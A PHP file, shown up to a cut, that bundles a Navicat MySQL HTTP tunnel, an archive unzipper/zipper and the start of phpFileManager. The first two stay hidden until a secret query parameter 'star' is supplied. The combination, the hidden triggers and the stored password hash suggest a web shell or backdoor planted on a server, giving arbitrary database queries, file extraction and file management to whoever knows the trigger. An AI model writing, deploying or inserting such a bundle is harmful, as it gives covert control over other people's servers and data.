<?php
//{"lang":"","fm_root":".\/..\/","timezone":"","date_format":"Y\/m\/d H:i","auth_pass":"8ff953dd97c4405234a04291dee39e0b","error_reporting":1}

if (isset($_GET['m'])) {
	if($_GET['m']!='star')exit;
	//set allowTestMenu to false to disable System/Server test page
	$allowTestMenu = true;

	$use_mysqli = function_exists("mysqli_connect");

	header("Content-Type: text/plain; charset=x-user-defined");
	error_reporting(0);
	set_time_limit(0);

	function phpversion_int()
	{
		list($maVer, $miVer, $edVer) = preg_split("(/|\.|-)", phpversion());
		return $maVer * 10000 + $miVer * 100 + $edVer;
	}

	if (phpversion_int() < 50300) {
		set_magic_quotes_runtime(0);
	}

	function GetLongBinary($num)
	{
		return pack("N", $num);
	}

	function GetShortBinary($num)
	{
		return pack("n", $num);
	}

	function GetDummy($count)
	{
		$str = "";
		for ($i = 0; $i < $count; $i++)
			$str .= "\x00";
		return $str;
	}

	function GetBlock($val)
	{
		$len = strlen($val);
		if ($len < 254)
			return chr($len) . $val;
		else
			return "\xFE" . GetLongBinary($len) . $val;
	}

	function EchoHeader($errno)
	{
		$str = GetLongBinary(1111);
		$str .= GetShortBinary(202);
		$str .= GetLongBinary($errno);
		$str .= GetDummy(6);
		echo $str;
	}

	function EchoConnInfo($conn)
	{
		if ($GLOBALS['use_mysqli']) {
			$str = GetBlock(mysqli_get_host_info($conn));
			$str .= GetBlock(mysqli_get_proto_info($conn));
			$str .= GetBlock(mysqli_get_server_info($conn));
			echo $str;
		} else {
			$str = GetBlock(mysql_get_host_info($conn));
			$str .= GetBlock(mysql_get_proto_info($conn));
			$str .= GetBlock(mysql_get_server_info($conn));
			echo $str;
		}
	}

	function EchoResultSetHeader($errno, $affectrows, $insertid, $numfields, $numrows)
	{
		$str = GetLongBinary($errno);
		$str .= GetLongBinary($affectrows);
		$str .= GetLongBinary($insertid);
		$str .= GetLongBinary($numfields);
		$str .= GetLongBinary($numrows);
		$str .= GetDummy(12);
		echo $str;
	}

	function EchoFieldsHeader($res, $numfields)
	{
		$str = "";
		for ($i = 0; $i < $numfields; $i++) {
			if ($GLOBALS['use_mysqli']) {
				$finfo = mysqli_fetch_field_direct($res, $i);
				$str .= GetBlock($finfo->name);
				$str .= GetBlock($finfo->table);

				$type = $finfo->type;
				$length = $finfo->length;

				$str .= GetLongBinary($type);

				$intflag = $finfo->flags;
				$str .= GetLongBinary($intflag);

				$str .= GetLongBinary($length);
			} else {
				$str .= GetBlock(mysql_field_name($res, $i));
				$str .= GetBlock(mysql_field_table($res, $i));

				$type = mysql_field_type($res, $i);
				$length = mysql_field_len($res, $i);
				switch ($type) {
					case "int":
						if ($length > 11) $type = 8;
						else $type = 3;
						break;
					case "real":
						if ($length == 12) $type = 4;
						elseif ($length == 22) $type = 5;
						else $type = 0;
						break;
					case "null":
						$type = 6;
						break;
					case "timestamp":
						$type = 7;
						break;
					case "date":
						$type = 10;
						break;
					case "time":
						$type = 11;
						break;
					case "datetime":
						$type = 12;
						break;
					case "year":
						$type = 13;
						break;
					case "blob":
						if ($length > 16777215) $type = 251;
						elseif ($length > 65535) $type = 250;
						elseif ($length > 255) $type = 252;
						else $type = 249;
						break;
					default:
						$type = 253;
				}
				$str .= GetLongBinary($type);

				$flags = explode(" ", mysql_field_flags($res, $i));
				$intflag = 0;
				if (in_array("not_null", $flags)) $intflag += 1;
				if (in_array("primary_key", $flags)) $intflag += 2;
				if (in_array("unique_key", $flags)) $intflag += 4;
				if (in_array("multiple_key", $flags)) $intflag += 8;
				if (in_array("blob", $flags)) $intflag += 16;
				if (in_array("unsigned", $flags)) $intflag += 32;
				if (in_array("zerofill", $flags)) $intflag += 64;
				if (in_array("binary", $flags)) $intflag += 128;
				if (in_array("enum", $flags)) $intflag += 256;
				if (in_array("auto_increment", $flags)) $intflag += 512;
				if (in_array("timestamp", $flags)) $intflag += 1024;
				if (in_array("set", $flags)) $intflag += 2048;
				$str .= GetLongBinary($intflag);

				$str .= GetLongBinary($length);
			}
		}
		echo $str;
	}

	function EchoData($res, $numfields, $numrows)
	{
		for ($i = 0; $i < $numrows; $i++) {
			$str = "";
			$row = null;
			if ($GLOBALS['use_mysqli'])
				$row = mysqli_fetch_row($res);
			else
				$row = mysql_fetch_row($res);
			for ($j = 0; $j < $numfields; $j++) {
				if (is_null($row[$j]))
					$str .= "\xFF";
				else
					$str .= GetBlock($row[$j]);
			}
			echo $str;
		}
	}


	function doSystemTest()
	{
		function output($description, $succ, $resStr)
		{
			echo "<tr><td class=\"TestDesc\">$description</td><td ";
			echo ($succ) ? "class=\"TestSucc\">$resStr[0]</td></tr>" : "class=\"TestFail\">$resStr[1]</td></tr>";
		}
		output("PHP version >= 4.0.5", phpversion_int() >= 40005, array("Yes", "No"));
		output("mysql_connect() available", function_exists("mysql_connect"), array("Yes", "No"));
		output("mysqli_connect() available", function_exists("mysqli_connect"), array("Yes", "No"));
		if (phpversion_int() >= 40302 && substr($_SERVER["SERVER_SOFTWARE"], 0, 6) == "Apache" && function_exists("apache_get_modules")) {
			if (in_array("mod_security2", apache_get_modules()))
				output("Mod Security 2 installed", false, array("No", "Yes"));
		}
	}

	/////////////////////////////////////////////////////////////////////////////
	////

	if (phpversion_int() < 40005) {
		EchoHeader(201);
		echo GetBlock("unsupported php version");
		exit();
	}

	if (phpversion_int() < 40010) {
		global $HTTP_POST_VARS;
		$_POST = &$HTTP_POST_VARS;
	}

	if (!isset($_POST["actn"]) || !isset($_POST["host"]) || !isset($_POST["port"]) || !isset($_POST["login"])) {
		$testMenu = $allowTestMenu;
		if (!$testMenu) {
			EchoHeader(202);
			echo GetBlock("invalid parameters");
			exit();
		}
	}

	if (!$testMenu) {
		if ($_POST["encodeBase64"] == '1') {
			for ($i = 0; $i < count($_POST["q"]); $i++)
				$_POST["q"][$i] = base64_decode($_POST["q"][$i]);
		}

		if (!function_exists("mysql_connect") && !function_exists("mysqli_connect")) {
			EchoHeader(203);
			echo GetBlock("MySQL not supported on the server");
			exit();
		}

		$errno_c = 0;
		$hs = $_POST["host"];
		if ($use_mysqli) {
			if ($_POST["port"])
				$conn = mysqli_connect($hs, $_POST["login"], $_POST["password"], '', $_POST["port"]);
			else
				$conn = mysqli_connect($hs, $_POST["login"], $_POST["password"]);
			$errno_c = mysqli_connect_errno($conn);
			if (phpversion_int() >= 50005) {  // for unicode database name
				mysqli_set_charset($conn, 'UTF8');
			}
			if ($errno_c > 0) {
				EchoHeader($errno_c);
				echo GetBlock(mysqli_connect_error($conn));
				exit;
			}

			if (($errno_c <= 0) && ($_POST["db"] != "")) {
				$res = mysqli_select_db($conn, $_POST["db"]);
				$errno_c = mysqli_errno($conn);
			}

			EchoHeader($errno_c);
			if ($errno_c > 0) {
				echo GetBlock(mysqli_error($conn));
			} elseif ($_POST["actn"] == "C") {
				EchoConnInfo($conn);
			} elseif ($_POST["actn"] == "Q") {
				for ($i = 0; $i < count($_POST["q"]); $i++) {
					$query = $_POST["q"][$i];
					if ($query == "") continue;
					if (phpversion_int() < 50400) {
						if (get_magic_quotes_gpc())
							$query = stripslashes($query);
					}
					$res = mysqli_query($conn, $query);
					$errno = mysqli_errno($conn);
					$affectedrows = mysqli_affected_rows($conn);
					$insertid = mysqli_insert_id($conn);
					if (false !== $res) {
						$numfields = mysqli_field_count($conn);
						$numrows = mysqli_num_rows($res);
					} else {
						$numfields = 0;
						$numrows = 0;
					}
					EchoResultSetHeader($errno, $affectedrows, $insertid, $numfields, $numrows);
					if ($errno > 0)
						echo GetBlock(mysqli_error($conn));
					else {
						if ($numfields > 0) {
							EchoFieldsHeader($res, $numfields);
							EchoData($res, $numfields, $numrows);
						} else {
							if (phpversion_int() >= 40300)
								echo GetBlock(mysqli_info($conn));
							else
								echo GetBlock("");
						}
					}
					if ($i < (count($_POST["q"]) - 1))
						echo "\x01";
					else
						echo "\x00";
					if (false !== $res)
						mysqli_free_result($res);
				}
			}
		} else {
			if ($_POST["port"]) $hs .= ":" . $_POST["port"];
			$conn = mysql_connect($hs, $_POST["login"], $_POST["password"]);
			$errno_c = mysql_errno();
			if (phpversion_int() >= 50203) {  // for unicode database name
				mysql_set_charset('UTF8', $conn);
			}
			if (($errno_c <= 0) && ($_POST["db"] != "")) {
				$res = mysql_select_db($_POST["db"], $conn);
				$errno_c = mysql_errno();
			}

			EchoHeader($errno_c);
			if ($errno_c > 0) {
				echo GetBlock(mysql_error());
			} elseif ($_POST["actn"] == "C") {
				EchoConnInfo($conn);
			} elseif ($_POST["actn"] == "Q") {
				for ($i = 0; $i < count($_POST["q"]); $i++) {
					$query = $_POST["q"][$i];
					if ($query == "") continue;
					if (phpversion_int() < 50400) {
						if (get_magic_quotes_gpc())
							$query = stripslashes($query);
					}
					$res = mysql_query($query, $conn);
					$errno = mysql_errno();
					$affectedrows = mysql_affected_rows($conn);
					$insertid = mysql_insert_id($conn);
					$numfields = mysql_num_fields($res);
					$numrows = mysql_num_rows($res);
					EchoResultSetHeader($errno, $affectedrows, $insertid, $numfields, $numrows);
					if ($errno > 0)
						echo GetBlock(mysql_error());
					else {
						if ($numfields > 0) {
							EchoFieldsHeader($res, $numfields);
							EchoData($res, $numfields, $numrows);
						} else {
							if (phpversion_int() >= 40300)
								echo GetBlock(mysql_info($conn));
							else
								echo GetBlock("");
						}
					}
					if ($i < (count($_POST["q"]) - 1))
						echo "\x01";
					else
						echo "\x00";
					mysql_free_result($res);
				}
			}
		}
		exit();
	}

	header("Content-Type: text/html");
	////
	/////////////////////////////////////////////////////////////////////////////
	?>

		<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
		<html>

		<head>
			<title>Navicat HTTP Tunnel Tester</title>
			<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
			<style type="text/css">
				body {
					margin: 30px;
					font-family: Tahoma;
					font-weight: normal;
					font-size: 14px;
					color: #222222;
				}

				table {
					width: 100%;
					border: 0px;
				}

				input {
					font-family: Tahoma, sans-serif;
					border-style: solid;
					border-color: #666666;
					border-width: 1px;
				}

				fieldset {
					border-style: solid;
					border-color: #666666;
					border-width: 1px;
				}

				.Title1 {
					font-size: 30px;
					color: #003366;
				}

				.Title2 {
					font-size: 10px;
					color: #999966;
				}

				.TestDesc {
					width: 70%
				}

				.TestSucc {
					color: #00BB00;
				}

				.TestFail {
					color: #DD0000;
				}

				.mysql {}

				.pgsql {
					display: none;
				}

				.sqlite {
					display: none;
				}

				#page {
					max-width: 42em;
					min-width: 36em;
					border-width: 0px;
					margin: auto auto;
				}

				#host,
				#dbfile {
					width: 300px;
				}

				#port {
					width: 75px;
				}

				#login,
				#password,
				#db {
					width: 150px;
				}

				#Copyright {
					text-align: right;
					font-size: 10px;
					color: #888888;
				}
			</style>
			<script type="text/javascript">
				function getInternetExplorerVersion() {
					var ver = -1;
					if (navigator.appName == "Microsoft Internet Explorer") {
						var regex = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
						if (regex.exec(navigator.userAgent))
							ver = parseFloat(RegExp.$1);
					}
					return ver;
				}

				function setText(element, text, succ) {
					element.className = (succ) ? "TestSucc" : "TestFail";
					element.innerHTML = text;
				}

				function getByteAt(str, offset) {
					return str.charCodeAt(offset) & 0xff;
				}

				function getIntAt(binStr, offset) {
					return (getByteAt(binStr, offset) << 24) +
						(getByteAt(binStr, offset + 1) << 16) +
						(getByteAt(binStr, offset + 2) << 8) +
						(getByteAt(binStr, offset + 3) >>> 0);
				}

				function getBlockStr(binStr, offset) {
					if (getByteAt(binStr, offset) < 254)
						return binStr.substring(offset + 1, offset + 1 + binStr.charCodeAt(offset));
					else
						return binStr.substring(offset + 5, offset + 5 + getIntAt(binStr, offset + 1));
				}

				function doServerTest() {
					var version = getInternetExplorerVersion();
					if (version == -1 || version >= 9.0) {
						var xmlhttp = (window.XMLHttpRequest) ? new XMLHttpRequest() : xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");

						xmlhttp.onreadystatechange = function() {
							var outputDiv = document.getElementById("ServerTest");
							if (xmlhttp.readyState == 4) {
								if (xmlhttp.status == 200) {
									var errno = getIntAt(xmlhttp.responseText, 6);
									if (errno == 0)
										setText(outputDiv, "Connection Success!", true);
									else
										setText(outputDiv, parseInt(errno) + " - " + getBlockStr(xmlhttp.responseText, 16), false);
								} else
									setText(outputDiv, "HTTP Error - " + xmlhttp.status, false);
							}
						}

						var params = "";
						var form = document.getElementById("TestServerForm");
						for (var i = 0; i < form.elements.length; i++) {
							if (i > 0) params += "&";
							params += form.elements[i].id + "=" + form.elements[i].value.replace("&", "%26");
						}

						document.getElementById("ServerTest").className = "";
						document.getElementById("ServerTest").innerHTML = "Connecting...";
						xmlhttp.open("POST", "", true);
						xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						xmlhttp.setRequestHeader("Content-length", params.length);
						xmlhttp.setRequestHeader("Connection", "close");
						xmlhttp.send(params);
					} else {
						document.getElementById("ServerTest").className = "";
						document.getElementById("ServerTest").innerHTML = "Internet Explorer " + version + " is not supported, please use Internet explorer 9.0 or above, firefox, chrome or safari";
					}
				}
			</script>
		</head>

		<body>
			<div id="page">
				<p>
					<font class="Title1">Navicat&trade;</font><br>
					<font class="Title2">The gateway to your database!</font>
				</p>
				<fieldset>
					<legend>System Environment Test</legend>
					<table>
						<tr style="<?php echo "display:none"; ?>">
							<td width=70%>PHP installed properly</td>
							<td class="TestFail">No</td>
						</tr>
						<?php echo doSystemTest(); ?>
					</table>
				</fieldset>
				<br>
				<fieldset>
					<legend>Server Test</legend>
					<form id="TestServerForm" action="#" onSubmit="return false;">
						<input type=hidden id="actn" value="C">
						<table>
							<tr class="mysql">
								<td width="35%">Hostname/IP Address:</td>
								<td><input type=text id="host" placeholder="localhost"></td>
							</tr>
							<tr class="mysql">
								<td>Port:</td>
								<td><input type=text id="port" placeholder="3306"></td>
							</tr>
							<tr class="pgsql">
								<td>Initial Database:</td>
								<td><input type=text id="db" placeholder="template1"></td>
							</tr>
							<tr class="mysql">
								<td>Username:</td>
								<td><input type=text id="login" placeholder="root"></td>
							</tr>
							<tr class="mysql">
								<td>Password:</td>
								<td><input type=password id="password" placeholder=""></td>
							</tr>
							<tr class="sqlite">
								<td>Database File:</td>
								<td><input type=text id="dbfile" placeholder="sqlite.db"></td>
							</tr>
							<tr>
								<td></td>
								<td><br><input id="TestButton" type="submit" value="Test Connection" onClick="doServerTest()"></td>
							</tr>
						</table>
					</form>
					<div id="ServerTest"><br></div>
				</fieldset>
				<p id="Copyright">Copyright &copy; PremiumSoft &trade; CyberTech Ltd. All Rights Reserved.</p>
			</div>
		</tr>

		</html>
	<?php
	exit;	
}elseif(isset($_GET['z'])){
	if($_GET['z']!='star')exit;
	
/**
 * The Unzipper extracts .zip or .rar archives and .gz files on webservers.
 * It's handy if you do not have shell access. E.g. if you want to upload a lot
 * of files (php framework or image collection) as an archive to save time.
 * As of version 0.1.0 it also supports creating archives.
 *
 * @author  Andreas Tasch, at[tec], attec.at
 * @license GNU GPL v3
 * @package attec.toolbox
 * @version 0.1.1
 */
define('VERSION', '0.1.1');

$timestart = microtime(TRUE);
$GLOBALS['status'] = array();

/**
 * Class Unzipper
 */
class Unzipper {
	public $localdir = '.';
	public $zipfiles = array();
  
	public function __construct() {
	  // Read directory and pick .zip, .rar and .gz files.
	  if ($dh = opendir($this->localdir)) {
		while (($file = readdir($dh)) !== FALSE) {
		  if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'
			|| pathinfo($file, PATHINFO_EXTENSION) === 'gz'
			|| pathinfo($file, PATHINFO_EXTENSION) === 'rar'
		  ) {
			$this->zipfiles[] = $file;
		  }
		}
		closedir($dh);
  
		if (!empty($this->zipfiles)) {
		  $GLOBALS['status'] = array('info' => '.zip or .gz or .rar files found, ready for extraction');
		}
		else {
		  $GLOBALS['status'] = array('info' => 'No .zip or .gz or rar files found. So only zipping functionality available.');
		}
	  }
	}
  
	/**
	 * Prepare and check zipfile for extraction.
	 *
	 * @param string $archive
	 *   The archive name including file extension. E.g. my_archive.zip.
	 * @param string $destination
	 *   The relative destination path where to extract files.
	 */
	public function prepareExtraction($archive, $destination = '') {
	  // Determine paths.
	  if (empty($destination)) {
		$extpath = $this->localdir;
	  }
	  else {
		$extpath = $this->localdir . '/' . $destination;
		// Todo: move this to extraction function.
		if (!is_dir($extpath)) {
		  mkdir($extpath);
		}
	  }
	  // Only local existing archives are allowed to be extracted.
	  if (in_array($archive, $this->zipfiles)) {
		self::extract($archive, $extpath);
	  }
	}
  
	/**
	 * Checks file extension and calls suitable extractor functions.
	 *
	 * @param string $archive
	 *   The archive name including file extension. E.g. my_archive.zip.
	 * @param string $destination
	 *   The relative destination path where to extract files.
	 */
	public static function extract($archive, $destination) {
	  $ext = pathinfo($archive, PATHINFO_EXTENSION);
	  switch ($ext) {
		case 'zip':
		  self::extractZipArchive($archive, $destination);
		  break;
		case 'gz':
		  self::extractGzipFile($archive, $destination);
		  break;
		case 'rar':
		  self::extractRarArchive($archive, $destination);
		  break;
	  }
  
	}
  
	/**
	 * Decompress/extract a zip archive using ZipArchive.
	 *
	 * @param $archive
	 * @param $destination
	 */
	public static function extractZipArchive($archive, $destination) {
	  // Check if webserver supports unzipping.
	  if (!class_exists('ZipArchive')) {
		$GLOBALS['status'] = array('error' => 'Error: Your PHP version does not support unzip functionality.');
		return;
	  }
  
	  $zip = new ZipArchive;
  
	  // Check if archive is readable.
	  if ($zip->open($archive) === TRUE) {
		// Check if destination is writable
		if (is_writeable($destination . '/')) {
		  $zip->extractTo($destination);
		  $zip->close();
		  $GLOBALS['status'] = array('success' => 'Files unzipped successfully');
		}
		else {
		  $GLOBALS['status'] = array('error' => 'Error: Directory not writeable by webserver.');
		}
	  }
	  else {
		$GLOBALS['status'] = array('error' => 'Error: Cannot read .zip archive.');
	  }
	}
  
	/**
	 * Decompress a .gz File.
	 *
	 * @param string $archive
	 *   The archive name including file extension. E.g. my_archive.zip.
	 * @param string $destination
	 *   The relative destination path where to extract files.
	 */
	public static function extractGzipFile($archive, $destination) {
	  // Check if zlib is enabled
	  if (!function_exists('gzopen')) {
		$GLOBALS['status'] = array('error' => 'Error: Your PHP has no zlib support enabled.');
		return;
	  }
  
	  $filename = pathinfo($archive, PATHINFO_FILENAME);
	  $gzipped = gzopen($archive, "rb");
	  $file = fopen($destination . '/' . $filename, "w");
  
	  while ($string = gzread($gzipped, 4096)) {
		fwrite($file, $string, strlen($string));
	  }
	  gzclose($gzipped);
	  fclose($file);
  
	  // Check if file was extracted.
	  if (file_exists($destination . '/' . $filename)) {
		$GLOBALS['status'] = array('success' => 'File unzipped successfully.');
  
		// If we had a tar.gz file, let's extract that tar file.
		if (pathinfo($destination . '/' . $filename, PATHINFO_EXTENSION) == 'tar') {
		  $phar = new PharData($destination . '/' . $filename);
		  if ($phar->extractTo($destination)) {
			$GLOBALS['status'] = array('success' => 'Extracted tar.gz archive successfully.');
			// Delete .tar.
			unlink($destination . '/' . $filename);
		  }
		}
	  }
	  else {
		$GLOBALS['status'] = array('error' => 'Error unzipping file.');
	  }
  
	}
  
	/**
	 * Decompress/extract a Rar archive using RarArchive.
	 *
	 * @param string $archive
	 *   The archive name including file extension. E.g. my_archive.zip.
	 * @param string $destination
	 *   The relative destination path where to extract files.
	 */
	public static function extractRarArchive($archive, $destination) {
	  // Check if webserver supports unzipping.
	  if (!class_exists('RarArchive')) {
		$GLOBALS['status'] = array('error' => 'Error: Your PHP version does not support .rar archive functionality. <a class="info" href="http://php.net/manual/en/rar.installation.php" target="_blank">How to install RarArchive</a>');
		return;
	  }
	  // Check if archive is readable.
	  if ($rar = RarArchive::open($archive)) {
		// Check if destination is writable
		if (is_writeable($destination . '/')) {
		  $entries = $rar->getEntries();
		  foreach ($entries as $entry) {
			$entry->extract($destination);
		  }
		  $rar->close();
		  $GLOBALS['status'] = array('success' => 'Files extracted successfully.');
		}
		else {
		  $GLOBALS['status'] = array('error' => 'Error: Directory not writeable by webserver.');
		}
	  }
	  else {
		$GLOBALS['status'] = array('error' => 'Error: Cannot read .rar archive.');
	  }
	}
  
  }
  
  /**
   * Class Zipper
   *
   * Copied and slightly modified from http://at2.php.net/manual/en/class.ziparchive.php#110719
   * @author umbalaconmeogia
   */
  class Zipper {
	/**
	 * Add files and sub-directories in a folder to zip file.
	 *
	 * @param string $folder
	 *   Path to folder that should be zipped.
	 *
	 * @param ZipArchive $zipFile
	 *   Zipfile where files end up.
	 *
	 * @param int $exclusiveLength
	 *   Number of text to be exclusived from the file path.
	 */
	private static function folderToZip($folder, &$zipFile, $exclusiveLength) {
	  $handle = opendir($folder);
  
	  while (FALSE !== $f = readdir($handle)) {
		// Check for local/parent path or zipping file itself and skip.
		if ($f != '.' && $f != '..' && $f != basename(__FILE__)) {
		  $filePath = "$folder/$f";
		  // Remove prefix from file path before add to zip.
		  $localPath = substr($filePath, $exclusiveLength);
  
		  if (is_file($filePath)) {
			$zipFile->addFile($filePath, $localPath);
		  }
		  elseif (is_dir($filePath)) {
			// Add sub-directory.
			$zipFile->addEmptyDir($localPath);
			self::folderToZip($filePath, $zipFile, $exclusiveLength);
		  }
		}
	  }
	  closedir($handle);
	}
  
	/**
	 * Zip a folder (including itself).
	 *
	 * Usage:
	 *   Zipper::zipDir('path/to/sourceDir', 'path/to/out.zip');
	 *
	 * @param string $sourcePath
	 *   Relative path of directory to be zipped.
	 *
	 * @param string $outZipPath
	 *   Relative path of the resulting output zip file.
	 */
	public static function zipDir($sourcePath, $outZipPath) {
	  $pathInfo = pathinfo($sourcePath);
	  $parentPath = $pathInfo['dirname'];
	  $dirName = $pathInfo['basename'];
  
	  $z = new ZipArchive();
	  $z->open($outZipPath, ZipArchive::CREATE);
	  $z->addEmptyDir($dirName);
	  if ($sourcePath == $dirName) {
		self::folderToZip($sourcePath, $z, 0);
	  }
	  else {
		self::folderToZip($sourcePath, $z, strlen("$parentPath/"));
	  }
	  $z->close();
  
	  $GLOBALS['status'] = array('success' => 'Successfully created archive ' . $outZipPath);
	}
  }
  
$unzipper = new Unzipper;
if (isset($_POST['dounzip'])) {
  // Check if an archive was selected for unzipping.
  $archive = isset($_POST['zipfile']) ? strip_tags($_POST['zipfile']) : '';
  $destination = isset($_POST['extpath']) ? strip_tags($_POST['extpath']) : '';
  $unzipper->prepareExtraction($archive, $destination);
}

if (isset($_POST['dozip'])) {
  $zippath = !empty($_POST['zippath']) ? strip_tags($_POST['zippath']) : '.';
  // Resulting zipfile e.g. zipper--2016-07-23--11-55.zip.
  $zipfile = 'zipper-' . date("Y-m-d--H-i") . '.zip';
  Zipper::zipDir($zippath, $zipfile);
}

$timeend = microtime(TRUE);
$time = round($timeend - $timestart, 4);
?>

<!DOCTYPE html>
<html>
<head>
  <title>File Unzipper + Zipper</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style type="text/css">
    body {
      font-family: Arial, sans-serif;
      line-height: 150%;
    }

    label {
      display: block;
      margin-top: 20px;
    }

    fieldset {
      border: 0;
      background-color: #EEE;
      margin: 10px 0 10px 0;
    }

    .select {
      padding: 5px;
      font-size: 110%;
    }

    .status {
      margin: 0;
      margin-bottom: 20px;
      padding: 10px;
      font-size: 80%;
      background: #EEE;
      border: 1px dotted #DDD;
    }

    .status--ERROR {
      background-color: red;
      color: white;
      font-size: 120%;
    }

    .status--SUCCESS {
      background-color: green;
      font-weight: bold;
      color: white;
      font-size: 120%
    }

    .small {
      font-size: 0.7rem;
      font-weight: normal;
    }

    .version {
      font-size: 80%;
    }

    .form-field {
      border: 1px solid #AAA;
      padding: 8px;
      width: 280px;
    }

    .info {
      margin-top: 0;
      font-size: 80%;
      color: #777;
    }

    .submit {
      background-color: #378de5;
      border: 0;
      color: #ffffff;
      font-size: 15px;
      padding: 10px 24px;
      margin: 20px 0 20px 0;
      text-decoration: none;
    }

    .submit:hover {
      background-color: #2c6db2;
      cursor: pointer;
    }
  </style>
</head>
<body>
<p class="status status--<?php echo strtoupper(key($GLOBALS['status'])); ?>">
  Status: <?php echo reset($GLOBALS['status']); ?><br/>
  <span class="small">Processing Time: <?php echo $time; ?> seconds</span>
</p>
<form action="" method="POST">
  <fieldset>
    <h1>Archive Unzipper</h1>
    <label for="zipfile">Select .zip or .rar archive or .gz file you want to extract:</label>
    <select name="zipfile" size="1" class="select">
      <?php foreach ($unzipper->zipfiles as $zip) {
        echo "<option>$zip</option>";
      }
      ?>
    </select>
    <label for="extpath">Extraction path (optional):</label>
    <input type="text" name="extpath" class="form-field" />
    <p class="info">Enter extraction path without leading or trailing slashes (e.g. "mypath"). If left empty current directory will be used.</p>
    <input type="submit" name="dounzip" class="submit" value="Unzip Archive"/>
  </fieldset>

  <fieldset>
    <h1>Archive Zipper</h1>
    <label for="zippath">Path that should be zipped (optional):</label>
    <input type="text" name="zippath" class="form-field" />
    <p class="info">Enter path to be zipped without leading or trailing slashes (e.g. "zippath"). If left empty current directory will be used.</p>
    <input type="submit" name="dozip" class="submit" value="Zip Archive"/>
  </fieldset>
</form>
<p class="version">Unzipper version: <?php echo VERSION; ?></p>
</body>
</html>

<?php
exit;
}
		//{"lang":"","fm_root":"f:\\","timezone":"","date_format":"Y\/m\/d H:i","auth_pass":"8ff953dd97c4405234a04291dee39e0b","error_reporting":1}
		/*--------------------------------------------------
		 | PHP FILE MANAGER
		 +--------------------------------------------------
		 | phpFileManager 1.7.8
		 | By Fabricio Seger Kolling
		 | Copyright (c) 2004-2019 Fabrício Seger Kolling
		 | E-mail: dulldusk@gmail.com
		 | URL: http://phpfm.sf.net
		 | Last Changed: 2019-02-24
		 +--------------------------------------------------
		 | It is the AUTHOR'S REQUEST that you keep intact the above header information
		 | and notify it only if you conceive any BUGFIXES or IMPROVEMENTS to this program.
		 +--------------------------------------------------
		 | LICENSE
		 +--------------------------------------------------
		 | Licensed under the terms of any of the following licenses at your choice:
		 | - GNU General Public License Version 2 or later (the "GPL");
		 | - GNU Lesser General Public License Version 2.1 or later (the "LGPL");
		 | - Mozilla Public License Version 1.1 or later (the "MPL").
		 | You are not required to, but if you want to explicitly declare the license
		 | you have chosen to be bound to when using, reproducing, modifying and
		 | distributing this software, just include a text file titled "LICENSE" in your version
		 | of this software, indicating your license choice. In any case, your choice will not
		 | restrict any recipient of your version of this software to use, reproduce, modify
		 | and distribute this software under any of the above licenses.
		 +--------------------------------------------------
		 | CONFIGURATION AND INSTALATION NOTES
		 +--------------------------------------------------
		 | This program does not include any instalation or configuration
		 | notes because it simply does not require them.
		 | Just throw this file anywhere in your webserver and enjoy !!
		 +--------------------------------------------------
		*/
		// +--------------------------------------------------
		// | Config
		// +--------------------------------------------------
		$version = '1.7.8';
		$charset = 'UTF-8';
		$debug_mode = false;
		$max_php_recursion = 200;
		$resolve_ids = 0;
		$quota_mb = 0;
		$upload_ext_filter = array();
		$download_ext_filter = array();
		$cookie_cache_time = 60*60*24*30; // 30 Days
		$fm_color = array();
		$fm_color['Bg'] = "EEEEEE";
		$fm_color['Text'] = "000000";
		$fm_color['Link'] = "0A77F7";
		$fm_color['Entry'] = "FFFFFF";
		$fm_color['Over'] = "C0EBFD";
		$fm_color['Mark'] = "A7D2E4";
		// https://pt.wikipedia.org/wiki/Lista_de_portas_dos_protocolos_TCP_e_UDP
		$services = array();
		//$services['13:UDP'] = "DAYTIME";
		$services['21'] = "FTP";
		$services['22'] = "SSH";
		$services['23'] = "TELNET";
		$services['25'] = "SMTP";
		//$services['53:UDP'] = "DNS";
		//$services['67:UDP'] = "DHCP";
		//$services['68:UDP'] = "BOOTP";
		//$services['69:UDP'] = "TFTP";
		$services['80'] = "HTTPD";
		$services['110'] = "POP3";
		//$services['123:UDP'] = "NTP";
		//$services['137:UDP'] = "NETBIOS-NS";
		//$services['138:UDP'] = "NETBIOS-DATA";
		$services['139'] = "NETBIOS-SESSION";
		$services['143'] = "IMAP";
		$services['161'] = "SNMP";
		$services['389'] = "LDAP";
		$services['445'] = "SMB-AD";
		//$services['445:UDP'] = "SMB-FS";
		$services['465'] = "SMTPS-SSL";
		$services['512'] = "RPC";
		$services['514'] = "RSH";
		//$services['514:UDP'] = "SYSLOG";
		$services['515'] = "LPD-PRINTER";
		//$services['520:UDP'] = "RIP-ROUTER";
		$services['530'] = "RPC";
		$services['540'] = "UUCP";
		$services['544'] = "KSHELL";
		$services['556'] = "REMOTE-FS";
		$services['587'] = "SMTPS-TLS";
		$services['593'] = "HTTP-RPC";
		$services['631'] = "IPP";
		$services['636'] = "LDAPS";
		$services['993'] = "IMAPS";
		$services['995'] = "POP3S";
		$services['990'] = "FTPS";
		$services['992'] = "TELNETS";
		$services['1433'] = "MSSQL";
		$services['1521'] = "ORACLE";
		$services['3306'] = "MYSQL/MARIADB";
		$services['3389'] = "RDESKTOP";
		$services['5900'] = "VNC";
		$services['7778'] = "KLOXO-ADMIN";
		$services['8080'] = "HTTPD-ALT";
		$services['8200'] = "GOTOMYPC";
		$services['10000'] = "VIRTUALMIN-ADMIN";
		$services['27017'] = "MONGODB";
		$services['50000'] = "DB2";
		// +--------------------------------------------------
		// | Header and Globals
		// +--------------------------------------------------
		@ob_start(); // For ChromePhp Debug and JSONRPC to Work!
		function getmicrotime(){
		   list($usec, $sec) = explode(" ", microtime());
		   return ((float)$usec + (float)$sec);
		}
		$script_init_time = getmicrotime();
		function log_script_time(){
			global $script_init_time;
			fb_log(number_format((getmicrotime()-$script_init_time), 3, '.', '')."s");
		}
		$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
		$max_php_recursion_counter = 0;
		if(!isset($_SERVER['PATH_INFO']) && isset($_SERVER["ORIG_PATH_INFO"])) {
